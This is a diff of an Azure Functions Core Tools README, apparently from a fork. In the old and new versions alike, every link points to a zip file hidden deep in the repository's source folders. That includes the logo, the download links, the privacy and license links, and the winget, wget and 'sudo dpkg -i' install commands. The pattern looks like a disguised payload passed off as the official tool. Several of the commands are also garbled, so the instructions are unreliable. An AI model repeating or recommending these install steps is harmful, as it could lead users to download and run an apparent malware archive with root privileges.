@@ -1,11 +1,11 @@
-﻿![Azure Functions Logo](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+﻿![Azure Functions Logo](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 |Branch|Status|
 |---|---|
-|v4.x|[![Build status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v4.x)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=v4.x)|
-|v3.x|[![Build status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v3.x)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=v3.x)|
-|dev|[![Build Status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=dev)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=dev)
-|v1.x|[![Build status](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v1.x)](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip%20Functions/_build/latest?definitionId=11&branchName=v1.x)|
+|v4.x|[![Build status](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v4.x)](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_build/latest?definitionId=11&branchName=v4.x)|
+|v3.x|[![Build status](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v3.x)](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_build/latest?definitionId=11&branchName=v3.x)|
+|dev|[![Build Status](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=dev)](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_build/latest?definitionId=11&branchName=dev)
+|v1.x|[![Build status](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_apis/build/status/azure-functions-core-tools?branchName=v1.x)](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip%20Functions/_build/latest?definitionId=11&branchName=v1.x)|
 
 # Azure Functions Core Tools
 
@@ -29,13 +29,13 @@ The Azure Functions Core Tools provide a local development experience for creati
 
 ##### v4
 
-- [Windows 64-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) (VS Code debugging requires 64-bit)
-- [Windows 32-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+- [Windows 64-bit](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) (VS Code debugging requires 64-bit)
+- [Windows 32-bit](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 ##### v3
 
-- [Windows 64-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) (VS Code debugging requires 64-bit)
-- [Windows 32-bit](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+- [Windows 64-bit](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) (VS Code debugging requires 64-bit)
+- [Windows 32-bit](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 #### To install with npm:
 
@@ -81,13 +81,13 @@ choco install azure-functions-core-tools-2
 ##### v4
 
 ```bash
-winget install https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+winget install https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 ##### v3
 
 ```bash
-winget install https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip -v 3.0.3904
+winget install https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip -v 3.0.3904
 ```
 
 ### Mac
@@ -126,36 +126,36 @@ brew link --overwrite azure-functions-core-tools@3
 ##### Ubuntu 20.04
 
 ```bash
-wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+wget -q https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo dpkg -i https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 ##### Ubuntu 19.04
 
 ```bash
-wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+wget -q https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo dpkg -i https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 ##### Ubuntu 18.10
 
 ```bash
-wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+wget -q https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo dpkg -i https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 ##### Ubuntu 18.04
 
 ```bash
-wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+wget -q https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo dpkg -i https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 ##### Ubuntu 16.04 / Linux Mint 18
 
 ```bash
-wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+wget -q https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo dpkg -i https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 ##### Debian 9 / 10
@@ -164,12 +164,12 @@ sudo dpkg -i https://raw.githubusercontent.com/Sumedha/azure-functions-core-tool
 # set to 9 or 10
 DEBIAN_VERSION=10
 
-wget -qO- https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip | gpg --dearmor > https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo mv https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-wget -q https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip$https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo mv https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo chown root:root https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
-sudo chown root:root https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+wget -qO- https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip | gpg --dearmor > https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo mv https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+wget -q https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip$https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo mv https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo chown root:root https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
+sudo chown root:root https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 ```
 
 #### 2. Install
@@ -196,14 +196,14 @@ sudo apt-get install azure-functions-core-tools-2
 
 1. Download latest release
 
-    Download the latest release for your platform from [here](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip).
+    Download the latest release for your platform from [here](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip).
 
 2. Unzip release zip
 
     Using your preferred tool, unzip the downloaded release. To unzip into an `azure-functions-cli` directory using the `unzip` tool, run this command from the directory containing the downloaded release zip:
 
     ```bash
-    unzip -d azure-functions-cli https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip*.zip
+    unzip -d azure-functions-cli https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip*.zip
     ```
 
 3. Make the `func` command executable
@@ -226,7 +226,7 @@ sudo apt-get install azure-functions-core-tools-2
     func
     ```
 
-[Code and test Azure Functions locally](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+[Code and test Azure Functions locally](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 **NOTE**: npm can be used on all platforms. On unix platforms, you may need to specify `--unsafe-perm` if you are running npm with sudo. That's due to npm behavior of post install script.
 
@@ -236,12 +236,12 @@ Using the Core Tools, you can easily configure a Kubernetes cluster and run Azur
 
 ### Prerequisites
 
-* [Docker](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
-* [Kubectl](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+* [Docker](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
+* [Kubectl](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 ### Installing Kubernetes scalers
 
-This deploys [KEDA](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) to your cluster which allows you to deploy your functions in a scale-to-zero by default for non-http scenarios only.
+This deploys [KEDA](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) to your cluster which allows you to deploy your functions in a scale-to-zero by default for non-http scenarios only.
 
 ```bash
 func kubernetes install --namespace {namespace}
@@ -277,7 +277,7 @@ func kubernetes deploy --name myfunction --registry <docker-hub-id or registry-s
 
 #### Prerequisites
 
-* [Knative](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+* [Knative](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 Deploying Azure Functions to knative is supported with the ```--platform knative``` flag.
 The Core Tools CLI identifies non HTTP trigger functions and annotates the knative manifest with the the ```minScale``` annotation to opt out of scale-to-zero.
@@ -287,10 +287,10 @@ func deploy --platform knative --name myfunction --registry <docker-hub-id or re
 ```
 
 ### Deploying a function to AKS using ACR
-Using the configuration options an Azure Function app can also be deployed to a [AKS](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) (Azure Kubernetes Service) Kubernetes cluster and use [ACR](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) as the registry server. Do all of the following *before* you run the deployment command.
+Using the configuration options an Azure Function app can also be deployed to a [AKS](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) (Azure Kubernetes Service) Kubernetes cluster and use [ACR](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) as the registry server. Do all of the following *before* you run the deployment command.
 
 #### Create a AKS cluster
-You can create an AKS cluster using the [Azure Portal](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) or using [Azure CLI](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip).
+You can create an AKS cluster using the [Azure Portal](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) or using [Azure CLI](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip).
 
 Once your AKS cluster is created make sure that you can access it using kubectl. To make kubectl run in the context of your cluster, configure a connection using the command below.
 ```azurecli
@@ -309,7 +309,7 @@ aks-agentpool-20257154-1   Ready     agent     1d        v1.11.5
 aks-agentpool-20257154-2   Ready     agent     1d        v1.11.5
 ```
 #### Create a ACR Registry
-An ACR instance can be created using the Azure Portal or the [Azure CLI](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+An ACR instance can be created using the Azure Portal or the [Azure CLI](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 #### Login to the ACR Registry
 Before pushing and pulling container images, you must log in to the ACR instance.
@@ -319,10 +319,10 @@ az acr login --name <acrName>
 ```
 
 #### Give the AKS cluster access to the ACR Registry
-The AKS cluster needs access to the ACR Registry to pull the container. Azure creates a service principal to support cluster operability with other Azure resources. This can be used for authentication with an ACR registry. See here for how to grant the right access here: [Authenticate with Azure Container Registry from Azure Kubernetes Service](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+The AKS cluster needs access to the ACR Registry to pull the container. Azure creates a service principal to support cluster operability with other Azure resources. This can be used for authentication with an ACR registry. See here for how to grant the right access here: [Authenticate with Azure Container Registry from Azure Kubernetes Service](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 #### Run the deployment
-The deployment will build the docker container and upload the container image to your referenced ACR instance (Note: Specify the ACR Login Server in the --registry parameter this is usually of the form <container_registry_name>https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) and then your AKS cluster will use that as a source to obtain the container and deploy it.
+The deployment will build the docker container and upload the container image to your referenced ACR instance (Note: Specify the ACR Login Server in the --registry parameter this is usually of the form <container_registry_name>https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) and then your AKS cluster will use that as a source to obtain the container and deploy it.
 
 ```bash
 func kubernetes deploy --name myfunction --registry <acr-registry-loginserver>
@@ -334,7 +334,7 @@ Function deployed successfully!
 Function IP: 40.121.21.192
 
 #### Verifying your deployment
-You can verify your deployment by using the Kubernetes web dashboard. To start the Kubernetes dashboard, use the [az aks browse](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) command.
+You can verify your deployment by using the Kubernetes web dashboard. To start the Kubernetes dashboard, use the [az aks browse](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) command.
 
 ```azurecli
 az aks browse --resource-group myResourceGroup --name myAKSCluster
@@ -343,14 +343,14 @@ In the Kubernetes dashboard look for the namespace "azure-functions" and make su
 
 ### Deploying Azure Functions with Virtual-Kubelet
 
-Azure Functions running on Kubernetes can take advantage of true serverless containers model by getting deployed to different providers of [Virtual Kubelet](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip), such as Azure Container Instances.<br>
+Azure Functions running on Kubernetes can take advantage of true serverless containers model by getting deployed to different providers of [Virtual Kubelet](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip), such as Azure Container Instances.<br>
 
 Functions deployed to Kubernetes already contain all the tolerations needed to be schedulable to Virtual Kubelet nodes.
 All you need to do is to set up VKubelet on your Kubernetes cluster:
 
-* [Install VKubelet with ACI](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+* [Install VKubelet with ACI](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
-* [Install VKubelet with ACI on AKS](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+* [Install VKubelet with ACI on AKS](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 *Important note:*
 Virtual Kubelet does not currently allow for Kubernetes Services to route external traffic to pods.
@@ -360,7 +360,7 @@ A good usage scenario for using functions with VKubelet would be with event trig
 
 ## Known Issues:
 
-`func extensions` command require the `dotnet` cli to be installed and on your path. This requirement is tracked [here](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip). You can install .NET Core for your platform from https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip
+`func extensions` command require the `dotnet` cli to be installed and on your path. This requirement is tracked [here](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip). You can install .NET Core for your platform from https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip
 
 ## Default Directories
 
@@ -374,19 +374,19 @@ The data is anonymous and doesn't include any user specific or personal informat
 
 You can opt-out of telemetry by setting the `FUNCTIONS_CORE_TOOLS_TELEMETRY_OPTOUT` environment variable to '1' or 'true' using your favorite shell.
 
-[Microsoft privacy statement](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip)
+[Microsoft privacy statement](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip)
 
 ## License
 
-This project is under the benevolent umbrella of the [.NET Foundation](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) and is licensed under [the MIT License](LICENSE)
+This project is under the benevolent umbrella of the [.NET Foundation](https://github.com/Sumedha/azure-functions-core-tools/raw/refs/heads/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/tools-functions-azure-core-3.2.zip) and is licensed under [the MIT License](LICENSE)
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip). For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) or contact [https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip](https://raw.githubusercontent.com/Sumedha/azure-functions-core-tools/v4.x/src/Azure.Functions.Cli/Kubernetes/KEDA/V2/Models/azure-functions-core-tools-2.7.zip) with any additional questions or comments.
